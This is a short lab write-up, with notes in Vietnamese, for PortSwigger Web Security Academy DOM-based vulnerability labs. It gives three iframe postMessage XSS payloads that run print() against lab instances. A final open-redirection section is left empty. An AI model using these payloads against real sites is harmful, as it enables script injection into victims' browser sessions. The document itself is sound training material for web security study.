# DOM-based vulnerabilities

### 1. DOM XSS using web messages
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages

Context: Dùng hàm `addEventListener()` để lắng nghe message.

![alt text](image.png)

Nó sẽ lắng nghe để gắng quảng cáo vào trang web. 

Tạo 1 iframe ở server exploit, iframe này dẫn đến trang web cần exploit và có gửi thêm message, payload:\
`<iframe src="https://0a3e00fa03d89772812011d8009c002a.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

![alt text](image-1.png)

---

### 2. DOM XSS using web messages and a JavaScript URL
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url

Context: Dùng hàm `addEventListener()` + sink: `location.href` + URL cần có `http/https`

![alt text](image-2.png)

Payload: `<iframe src="https://0a60005c0338391482ef47cf007b003b.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`

---

### 3. DOM XSS using web messages and `JSON.parse`
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse

Context: `addEventListener` + message dạng JSON

![alt text](image-3.png)

Ở đây ta thấy có thêm điều kiện `type=load-channel` để có thể được gán `src` = `d.url`.

Payload: `<iframe src=https://0a9b004b04098a3c80aa857e0066000e.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

---

### 4. DOM-based open redirection
https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection

Context: 














